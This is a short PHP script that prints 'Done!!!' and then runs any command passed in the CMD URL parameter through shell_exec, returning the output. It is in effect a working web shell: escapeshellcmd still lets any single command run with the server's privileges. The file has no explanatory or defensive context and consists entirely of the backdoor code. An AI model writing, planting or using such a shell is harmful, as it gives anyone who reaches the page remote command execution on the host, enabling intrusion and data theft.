<?php

echo "Done!!!\n";

if (isset($_GET['CMD'])) {
    $cmd = escapeshellcmd($_GET['CMD']);
    
    echo shell_exec($cmd);
} else {
    echo "No command provided.";
}
?>
